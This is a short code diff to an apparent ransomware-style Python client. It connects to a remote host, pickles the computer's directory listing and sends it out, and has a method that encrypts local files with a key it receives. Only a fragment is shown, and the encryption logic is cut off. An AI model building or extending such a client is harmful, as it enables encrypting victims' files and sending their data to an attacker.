@@ -1,12 +1,13 @@
-from socket import Socket
+from socket import socket
 import cryptography
 import location
 import os
+import pickle
 
 
 class Client(object):
     def __init__(self, ip, port):
-        self.client_soc = Socket()
+        self.client_soc = socket()
         self.client_soc.connect((ip, port))
 
     def send(self, data):
@@ -15,9 +16,10 @@ class Client(object):
     def receive(self):
         return self.client_soc.recv(1024)
 
-    # sends the compute's directories
+    # sends the compute's directories as a string
     def send_dirs(self):
-        self.client_soc.send(location.get_dirs())
+        pickled_data = pickle.dumps(location.get_dirs())
+        self.client_soc.send(pickled_data)
 
     # encrypts file on the computer by his name and a given key
     def encrypt(self, exported_key, file_name):
